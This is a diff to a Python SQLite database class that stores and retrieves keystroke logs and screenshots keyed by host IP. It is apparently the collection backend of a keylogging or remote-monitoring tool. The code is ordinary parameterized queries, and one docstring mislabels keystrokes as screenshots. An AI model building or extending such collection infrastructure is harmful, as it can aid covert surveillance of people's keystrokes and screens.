@@ -37,9 +37,9 @@ class Database(object):
         self.conn.close()
 
     def create(self, script=None):
-        '''
+        """
         Create the database with the given script
-        '''
+        """
         self.location = "db_servers.sqlite"
         # set the location of the script
         if script is None:
@@ -139,31 +139,55 @@ class Database(object):
         # Write the changes to the DB
         self.conn.commit()
 
-    def get_file_recent(self, ip):
+    def get_keystrokes(self, ip):
         """
-        Get the most recent screenshot from a specific host
+        Get screenshots from a specific host
         :param ip: host to retrieve from
-        :return: path to screenshot
+        :return: tables of keystroke lines
         """
         ip = ip.strip()
 
         # construct and execute query
-        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
-        results = self.handle_query(qry, ip)
+        qry = "SELECT * FROM {} WHERE {} = ?;".format("keystrokes", "ip")
+        self.cur.execute(qry, (ip,))
+        results = self.cur.fetchall()
 
         # return results if query succeeds
         if not results:
             return {}
         else:
-            return results[0]
+            return results
+
+    def get_files(self, ip):
+        """
+        Get screenshots from a specific host
+        :param ip: host to retrieve from
+        :return: tables of paths to screenshots
+        """
+        ip = ip.strip()
+
+        # construct and execute query
+        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
+        self.cur.execute(qry, (ip,))
+        results = self.cur.fetchall()
+
+        # return results if query succeeds
+        if not results:
+            return {}
+        else:
+            return results
 
     def GENERIC(self, table, col, val):
         """
         Use this function as a template for new query commands
         """
+        # construct and execute query
         qry = "SELECT * FROM {} WHERE {} = ?;".format(table, col)
-        results = self.handle_query(qry, val)
+        self.cur.execute(qry, (val,))
+        results = self.cur.fetchall()
+
+        # return results if query succeeds
         if not results:
-            return  {}
+            return {}
         else:
             return results[0]
